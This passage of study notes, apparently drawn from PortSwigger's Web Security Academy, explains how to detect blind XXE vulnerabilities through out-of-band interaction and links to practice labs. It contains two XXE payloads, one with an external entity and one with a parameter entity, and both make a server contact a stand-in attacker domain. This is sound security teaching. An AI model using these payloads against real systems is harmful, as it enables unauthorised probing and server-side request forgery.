 ## Detecting blind XXE using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

  
You can often detect blind XXE using the same technique as for [[2 > Exploiting XXE to perform SSRF attacks]] but triggering the out-of-band network interaction to a system that you control.  
  
For example, you would define an external entity as follows: 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
 You would then make use of the defined entity in a data value within the XML.  
This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.  
  
  >LAB [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)  
  
<br>

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used.  
In this situation, you might be able to use **XML parameter entities** instead._  
  
_**XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.**_  
  
**For present purposes, you only need to know two things :-** 
 
**First**, the declaration of an XML parameter entity _includes the percent character_ before the entity name:  
```xml 
<!ENTITY % myparameterentity "my parameter entity value" >
```  
  
**And second**, parameter entities are _referenced using the percent character_ instead of the usual ampersand:  
`%`myparameterentity;  

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:  
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
```
  
  
_This XXE payload declares an XML parameter entity called_ _`xxe`_ _and then uses the entity within the DTD._ This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.  
  
  
>LAB [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)